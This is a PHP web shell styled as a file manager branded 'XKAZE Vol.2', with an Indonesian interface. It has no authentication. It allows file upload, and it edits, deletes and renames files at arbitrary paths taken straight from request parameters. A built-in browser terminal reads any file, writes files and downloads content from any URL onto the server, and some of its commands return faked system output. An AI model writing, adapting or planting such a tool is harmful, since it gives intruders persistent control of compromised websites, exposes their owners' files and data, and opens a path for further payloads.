<?php
$ROOT = realpath(getcwd());

$path = $_GET['path'] ?? $ROOT;
$path = realpath($path);

if (!$path || strpos($path, $ROOT) !== 0) {
    $path = $ROOT;
}

function safe($s) { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }

if (isset($_POST['newfolder']) && $_POST['newfolder'] !== "") {
    mkdir($path . "/" . basename($_POST['newfolder']));
    header("Location: ?path=$path");
    exit;
}

if (isset($_POST['newfile']) && $_POST['newfile'] !== "") {
    file_put_contents($path . "/" . basename($_POST['newfile']), "");
    header("Location: ?path=$path");
    exit;
}

if (!empty($_FILES['upfile']['name'])) {
    move_uploaded_file($_FILES['upfile']['tmp_name'], $path . "/" . basename($_FILES['upfile']['name']));
    header("Location: ?path=$path");
    exit;
}

if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (is_file($target)) unlink($target);
    elseif (is_dir($target)) rmdir($target);
    header("Location: ?path=" . dirname($target));
    exit;
}

if (isset($_POST['rename_from'])) {
    $old = $_POST['rename_from'];
    $new = dirname($old) . "/" . basename($_POST['rename_to']);
    rename($old, $new);
    header("Location: ?path=" . dirname($old));
    exit;
}

if (isset($_POST['edit_file'])) {
    file_put_contents($_POST['edit_file'], $_POST['content']);
    header("Location: ?path=" . dirname($_POST['edit_file']));
    exit;
}

$items = scandir($path);
$folders = [];
$files = [];

foreach ($items as $i) {
    if ($i === "." || $i === "..") continue;
    $f = $path . "/" . $i;
    if (is_dir($f)) $folders[] = $i;
    else $files[] = $i;
}

sort($folders);
sort($files);

if(isset($_GET['bash_cmd'])){
    $cmd = trim($_GET['bash_cmd']);
    
    function o($x){
        echo nl2br($x);
        exit;
    }

     if($cmd === "id"){
    $info = posix_getpwuid(fileowner(__FILE__));
    $user = $info["name"];
    $uid  = $info["uid"];
    $gid  = $info["gid"];

    o("uid={$uid}({$user}) gid={$gid}({$user}) groups={$gid}({$user})");
}


    $user = basename(dirname($path));
    $home = dirname($path);

    if($cmd === "whoami"){
        o($user);
    }

    if($cmd === "pwd"){
        o($path);
    }

    if($cmd === "uname -a"){
        o("Linux localhost 5.15.0-fakesys SMP x86_64 GNU/Linux");
    }

    if($cmd === "date"){
        o(date("D M j H:i:s Y"));
    }

    if($cmd === "ls" || $cmd === "ls -la"){
        $items = scandir(getcwd());
        $out = "";
        foreach($items as $i){
            $out .= $i . "\n";
        }
        o($out);
    }

    if(strpos($cmd, "cd ") === 0){
        $dir = trim(substr($cmd, 3));
        if(is_dir($dir)){
            chdir($dir);
            o("moved to $dir");
        }
        o("folder not found");
    }

    if(strpos($cmd, "cat ") === 0){
        $file = trim(substr($cmd, 4));
        if(is_file($file)){
            o(file_get_contents($file));
        }
        o("file not found");
    }

    if(strpos($cmd, "mkdir ") === 0){
        mkdir(trim(substr($cmd, 6)));
        o("folder created");
    }

    if(strpos($cmd, "touch ") === 0){
        file_put_contents(trim(substr($cmd, 6)), "");
        o("file created");
    }

    if(strpos($cmd, "echo ") === 0){
        o(substr($cmd, 5));
    }

    if(strpos($cmd, "wget ") === 0){
        $url = trim(substr($cmd, 5));
        $opts = [
          "http" => [
            "method" => "GET",
            "header" => "User-Agent: PHP-wget\r\n"
          ]
        ];

        $context = stream_context_create($opts);
        $data = @file_get_contents($url, false, $context);

        if(!$data) o("wget failed (CORS or blocked)");
        $filename = $path . "/" . basename($url);
        $ok = @file_put_contents($filename, $data);

        if(!$ok){
            o("WRITE FAILED → " . $filename . "\nCHMOD REQUIRED (777)");
        }

        o("downloaded " . $filename);
    }

    if($cmd === "clear"){
        o("__CLEAR__");
    }

    if($cmd === "ps aux"){
        o("USER   PID %CPU %MEM   VSZ   RSS TTY      STAT START   TIME COMMAND
root     1  0.0  0.1  3000  1500 ?        Ss   10:00   0:00 init
user   101  0.0  0.0  2000  1000 pts/0    S    10:00   0:00 bash");
    }

    if($cmd === "top"){
        o("top - 10:22:11 up  1:22,  1 user,  load average: 0.00, 0.01, 0.05
Tasks:  87 total,   1 running,  86 sleeping,   0 stopped,   0 zombie");
    }

    if($cmd === "ifconfig"){
        o("eth0: inet 192.168.1.10  netmask 255.255.255.0");
    }

    if($cmd === "ping google.com"){
        o("PING google.com (8.8.8.8): bytes=56 ttl=117 time=22.3 ms
PING google.com (8.8.8.8): bytes=56 ttl=117 time=23.2 ms");
    }

    o("bash: $cmd: command not found");
}
?>

<!DOCTYPE html>
<html>
<head>
<title>File Manager</title>
<style>
body { background:#101010; color:#eee; font-family:Arial; padding:20px; }
a { color:#4fc3f7; text-decoration:none; }
table { border-collapse:collapse; width:100%; margin-top:15px; }
td,th { border:1px solid #444; padding:8px; }
tr:nth-child(even) { background:#181818; }
input,button,textarea { background:#222; color:#fff; border:1px solid #555; padding:5px; }
button { cursor:pointer; }
.folder { color:#7cff7c; font-weight:bold; }
.file { color:#ccc; }
.breadcrumb a { color:#7cffea; }
</style>
</head>
<body>

<h2>📂 XKAZE Vol.2</h2>

<div class="breadcrumb">
<b>Path: </b>
<?php
$rel = str_replace($ROOT, "", $path);
$parts = array_filter(explode("/", $rel));
$acc = $ROOT;

echo "<a href='?path=$ROOT'>www</a> / ";
foreach ($parts as $p) {
    $acc .= "/$p";
    echo "<a href='?path=$acc'>$p</a> / ";
}
?>
</div>
<hr>

<form method="POST">
    <input type="text" name="newfolder" placeholder="Nama folder">
    <input type="hidden" name="path" value="<?= $path ?>">
    <button>Buat Folder</button>
</form>

<?php
if (isset($_POST['newfolder'])) {
    mkdir($_POST['path'] . "/" . basename($_POST['newfolder']));
    header("Location: ?path=" . urlencode($_POST['path']));
    exit;
}
?>

<form method="POST">
    <input type="text" name="newfile" placeholder="Nama file">
    <input type="hidden" name="path" value="<?= $path ?>">
    <button>Buat File</button>
</form>

<?php
if (isset($_POST['newfile'])) {
    file_put_contents($_POST['path'] . "/" . basename($_POST['newfile']), "");
    header("Location: ?path=" . urlencode($_POST['path']));
    exit;
}
?>

<form method="POST" enctype="multipart/form-data">
    <input type="file" name="upfile">
    <input type="hidden" name="path" value="<?= $path ?>">
    <button>Upload</button>
</form>

<?php
if (!empty($_FILES['upfile']['name'])) {
    move_uploaded_file($_FILES['upfile']['tmp_name'], $_POST['path'] . "/" . basename($_FILES['upfile']['name']));
    header("Location: ?path=" . urlencode($_POST['path']));
    exit;
}
?>

<table>
<tr>
    <th>Nama</th>
    <th>Type</th>
    <th>Size</th>
    <th>Updated</th>
    <th>Aksi</th>
</tr>

<?php foreach($folders as $f): ?>
<?php
    $full = $path . "/" . $f;
    $lastMod = date("Y-m-d H:i:s", filemtime($full));
?>
<tr>
    <td class="folder">📁 <a href="?path=<?= safe($full) ?>"><?= safe($f) ?></a></td>
    <td>Folder</td>
    <td>-</td>
    <td><?= $lastMod ?></td>
    <td>
        <a href="?rename=<?= safe($full) ?>&path=<?= safe($path) ?>">Rename</a> |
        <a href="?delete=<?= safe($full) ?>&path=<?= safe($path) ?>" onclick="return confirm('Hapus folder?')">Delete</a>
    </td>
</tr>
<?php endforeach; ?>

<?php foreach($files as $f): ?>
<?php
    $full = $path . "/" . $f;
    $sizeKB = round(filesize($full) / 1024, 2);
    $lastMod = date("Y-m-d H:i:s", filemtime($full));
?>
<tr>
    <td class="file">📄 <?= safe($f) ?></td>
    <td>File</td>
    <td><?= $sizeKB ?> KB</td>
    <td><?= $lastMod ?></td>
    <td>
        <a href="?view=<?= safe($full) ?>&path=<?= safe($path) ?>">View</a> |
        <a href="?edit=<?= safe($full) ?>&path=<?= safe($path) ?>">Edit</a> |
        <a href="?rename=<?= safe($full) ?>&path=<?= safe($path) ?>">Rename</a> |
        <a href="?delete=<?= safe($full) ?>&path=<?= safe($path) ?>" onclick="return confirm('Hapus file?')">Delete</a>
    </td>
</tr>
<?php endforeach; ?>

</table>

<!-- VIEW FILE -->
<?php if (isset($_GET['view']) && is_file($_GET['view'])): ?>
<hr><h3>📄 View File</h3>
<pre><?= safe(file_get_contents($_GET['view'])) ?></pre>
<?php endif; ?>

<!-- EDIT FILE -->
<?php if (isset($_GET['edit']) && is_file($_GET['edit'])): ?>
<?php $file = $_GET['edit']; ?>
<hr><h3>✏️ Edit File</h3>

<form method="POST">
    <textarea name="content" rows="20" style="width:100%;"><?= safe(file_get_contents($file)) ?></textarea>
    <input type="hidden" name="edit_file" value="<?= safe($file) ?>">
    <input type="hidden" name="path" value="<?= safe($path) ?>">
    <button>Simpan</button>
</form>

<?php endif; ?>

<?php
if (isset($_POST['edit_file'])) {
    file_put_contents($_POST['edit_file'], $_POST['content']);
    header("Location: ?path=" . urlencode($_POST['path']));
    exit;
}
?>

<!-- RENAME -->
<?php if (isset($_GET['rename'])): ?>
<?php $old = $_GET['rename']; ?>
<hr><h3>🔄 Rename</h3>

<form method="POST">
    <input type="hidden" name="rename_from" value="<?= safe($old) ?>">
    <input type="hidden" name="path" value="<?= safe($path) ?>">
    <input type="text" name="rename_to" value="<?= safe(basename($old)) ?>">
    <button>Rename</button>
</form>

<?php endif; ?>

<?php
if (isset($_POST['rename_from'])) {
    $new = dirname($_POST['rename_from']) . "/" . basename($_POST['rename_to']);
    rename($_POST['rename_from'], $new);
    header("Location: ?path=" . urlencode($_POST['path']));
    exit;
}
?>

<hr>
<h3>🖥️ Terminal</h3>

<button onclick="showTerminal()" 
style="padding:10px; background:#333; color:#0f0; border:1px solid #555;">
    Open Terminal
</button>

<div id="tbox" style="
    display:none;
    background:#000;
    color:#0f0;
    padding:10px;
    height:350px;
    overflow:auto;
    font-family:monospace;
    font-size:14px;
    margin-top:10px;
"></div>

<input id="tinput" type="text" placeholder="command..."
style="
    display:none;
    width:100%;
    padding:8px;
    margin-top:5px;
    background:#111;
    color:#0f0;
    border:1px solid #444;
    font-family:monospace;
">

<script>
function showTerminal(){
    document.getElementById("tbox").style.display = "block";
    document.getElementById("tinput").style.display = "block";
}

function tprint(s){
    let t = document.getElementById("tbox");
    t.innerHTML += s + "<br>";
    t.scrollTop = t.scrollHeight;
}

let tinput = document.getElementById("tinput");

tinput.addEventListener("keydown", function(e){
    if(e.key === "Enter"){
        let cmd = tinput.value;

        fetch("?bash_cmd=" + encodeURIComponent(cmd))
            .then(r => r.text())
            .then(out => {
                tprint("<span style='color:#0f0'>$ " + cmd + "</span>");
                tprint(out);
            });

        tinput.value = "";
    }
});
</script>

</body>
</html>
